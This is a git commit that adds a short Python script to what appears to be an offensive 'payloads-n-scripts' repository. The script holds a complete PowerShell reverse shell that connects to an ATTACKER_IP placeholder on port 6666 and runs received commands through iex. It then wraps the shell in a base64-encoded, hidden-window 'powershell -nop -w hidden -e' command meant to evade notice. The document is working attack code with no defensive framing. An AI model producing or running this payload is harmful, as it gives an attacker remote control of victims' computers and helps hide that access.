990b9bafabbc8973ff29bb87b22fa7ab47f5e359
fanicia <mortenzc42@gmail.com>
2023-06-12 12:16:59 -0400

    Add python script for encoding payload.

---
+++ payloads-n-scripts/reverse-shells/powershell-UTF16LE.py
@@ -0,0 +1,6 @@
+import sys
+import base64
+
+payload = '$client = New-Object System.Net.Sockets.TCPClient("${ATTACKER_IP}", 6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+print(cmd)
